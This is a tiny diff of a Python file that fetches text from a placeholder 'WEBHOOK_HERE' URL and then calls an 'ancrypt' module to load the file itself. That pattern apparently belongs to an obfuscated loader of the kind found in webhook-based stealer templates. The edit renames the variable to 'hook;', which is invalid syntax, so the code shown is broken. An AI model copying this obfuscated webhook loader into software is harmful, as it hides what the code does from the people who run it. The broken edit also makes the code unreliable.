@@ -1,6 +1,6 @@
 import requests
 
-H00K = requests.get("WEBHOOK_HERE").text
+hook; = requests.get("WEBHOOK_HERE").text
 
 import ancrypt
 ancrypt.load(__file__)
